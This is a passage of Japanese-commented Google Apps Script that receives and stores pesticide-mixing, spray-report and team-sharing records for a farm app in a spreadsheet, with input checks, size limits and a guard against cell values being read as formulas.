      // 何が違うか(未設定なのか不一致なのか)は返さない。総当たりの手がかりになる。
      return json_({ ok: false, error: "auth" });
    }

    const type = data.type || "record";

    // 読み取り専用の種類(chemdbLoad / cloudLoad / pull / progress)は
    // ロックを取る前に doRead_ で処理済み。ここには来ない。

    // ── チーム共有:圃場・薬剤・作業リストのまとめ保存/読込 ──
    // 専用シート「_共有データ」に保存(PropertiesServiceの9KB上限を回避)
    if (type === "cloudSave") {
      if (!data.team) return json_({ ok: false, error: "team required" });
      const sh = getShareSheet_();
      const row = findShareRow_(sh, data.team);
      const payload = String(data.payload || "");
      // スプレッドシートの1セルは50000文字が上限。超えると切り捨て、あるいは
      // 書き込み自体が失敗して、次の cloudLoad で壊れたJSONが返る(無言のデータ破損)。
      // 余裕を見て45000文字で断り、アプリ側に「保存できなかった」と伝える。
      if (payload.length > 45000) {
        return json_({ ok: false, error: "データが大きすぎます(セル上限)" });
      }
      const when = new Date();
      if (row > 0) {
        // 上書きする前に、いまの値を履歴シートへ退避する
        pushShareLog_(data.team, data.by, sh.getRange(row, 2).getValue(), when);
        // payload はアプリが作るJSON文字列だが、"=" 始まりの値を作られると
        // セルが数式として評価されてしまう。読み出し側で困るので文字列に固定する。
        sh.getRange(row, 2).setValue(safeCell_(payload));
        sh.getRange(row, 3).setValue(when);
        sh.getRange(row, 4).setValue(safeCell_(data.by || ""));
      } else {
        sh.appendRow([safeCell_(data.team), safeCell_(payload), when, safeCell_(data.by || "")]);
      }
      return json_({ ok: true, saved: true, size: payload.length });
    }
    // ── 進捗共有(レコード単位) ──
    // cloudSave/cloudLoad と違い、送った件数ぶんだけを反映する。
    // 他の端末が入れた圃場・実績には触らない。
    if (type === "pushFields" || type === "pushWorks" || type === "pushChems") {
      if (!data.team) return json_({ ok: false, error: "team required" });
      const list = data.items;
      if (!Array.isArray(list)) return json_({ ok: false, error: "items required" });
      // 多すぎるぶんを黙って捨てると、送った側は成功したと思って再送しない。
      // 件数を返して、アプリ側に分割して送り直させる。
      if (list.length > PUSH_MAX) {
        return json_({ ok: false, error: "too many", max: PUSH_MAX, got: list.length });
      }
      if (type === "pushFields") {
        return json_(upsertRows_(getFieldSheet_(), FIELD_HEADERS, FIELD_ID_COL, FIELD_EDIT_COL,
                                 list, fieldRow_, data.team, "圃場"));
      }
      if (type === "pushChems") {
        return json_(upsertRows_(getChemSheet_(), CHEM_HEADERS, CHEM_ID_COL, CHEM_EDIT_COL,
                                 list, chemRow_, data.team, null));
      }
      return json_(upsertRows_(getWorkSheet_(), WORK_HEADERS, WORK_ID_COL, WORK_EDIT_COL,
                               list, workRow_, data.team, null));
    }

    const rec = data.record;
    if (!rec || !rec.id || !Array.isArray(rec.chems)) {
      return json_({ ok: false, error: "invalid payload" });
    }
    const sh = getSheet_();
    const row = findRow_(sh, rec.id);

    if (type === "record") {
      // 既に行がある場合は薬剤の内容だけ上書きする。
      // (実績入力のあとから薬剤を適用したケースを反映するため。行は増やさない)
      if (row > 0) {
        sh.getRange(row, COL.CHEM_N, 1, 4).setValues([[
          rec.chems.length,
          chemsText_(rec.chems),
          Number(rec.totalL) || 0,
          Math.round(Number(rec.waterMl) || 0) / 1000,
        ]]);
        return json_({ ok: true, updated: 1, chemsOnly: true });
      }
      sh.appendRow(buildRow_(data, "調合済"));
      colorByDate_(sh);
      return json_({ ok: true, added: 1 });
    }

    // ── 実績の取り消し ──
    // 作業タブのチェックを外したとき。行は消さない(調合した事実は残るため)。
    // 状態を「調合済」に戻し、実散布量と報告日だけを消す。
    // ここを送らずに済ませると、アプリは未実施・シートは散布済という食い違いが
    // 黙って残り、アグリノートへの転記までそのまま流れる。
    if (type === "unreport") {
      if (!rec || !rec.id) return json_({ ok: false, error: "invalid payload" });
      if (row <= 0) {
        // 元の行が無い(まだ一度も送っていない)。取り消すものが無いので成功扱い。
        // ここで失敗を返すと、アプリ側が永久に再送を続ける
        return json_({ ok: true, updated: 0, missing: true });
      }
      sh.getRange(row, COL.SPRAYED).setValue("");
      sh.getRange(row, COL.STATUS).setValue("調合済");
      sh.getRange(row, COL.REPORT_DATE).setValue("");
      return json_({ ok: true, updated: 1 });
    }

    if (type === "report") {
      // 散布完了報告:既存の行を更新
      if (row > 0) {
        sh.getRange(row, COL.SPRAYED).setValue(Number(rec.sprayedL) || "");
        sh.getRange(row, COL.STATUS).setValue("散布済");
        sh.getRange(row, COL.REPORT_DATE).setValue(safeCell_(rec.reportDate || ""));
        if (rec.reportAreaA) sh.getRange(row, COL.AREA).setValue(Number(rec.reportAreaA) || "");
        if (rec.reportMemo) sh.getRange(row, COL.MEMO).setValue(safeCell_(rec.reportMemo));
        return json_({ ok: true, updated: 1 });
      }
      // 元の記録が見つからない場合は報告内容ごと新規追加(取りこぼし防止)
      sh.appendRow(buildRow_(data, "散布済"));
      colorByDate_(sh);
      return json_({ ok: true, added: 1 });
    }

    return json_({ ok: false, error: "unknown type" });
  } catch (err) {
    return json_({ ok: false, error: String(err) });
  } finally {
    lock.releaseLock();
  }
}

// ── 接続テスト(アプリの「接続テスト」ボタンからのGET) ──
function doGet() {
  // secured は「合言葉が設定済みか」。false のときアプリ側で
  // 「合言葉が未設定です」と出せるようにするための情報で、合言葉そのものは返さない。
  return json_({
    ok: true,
    app: "薬液調合ノート 受信口 v10(1散布=1行・進捗共有・実績取消対応)",
    sheet: SHEET_NAME,
    secured: !!sharedSecret_(),
    // アプリ側が「このGASは進捗マップに対応しているか」を判定するための印。
    // 古いGASのまま進捗マップを開くと unknown type が返るだけで理由が分からない。
    features: ["record", "report", "unreport", "chemdbLoad", "cloudSave", "cloudLoad",
               "pushFields", "pushWorks", "pushChems", "pull", "progress"],
  });
}

function json_(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}
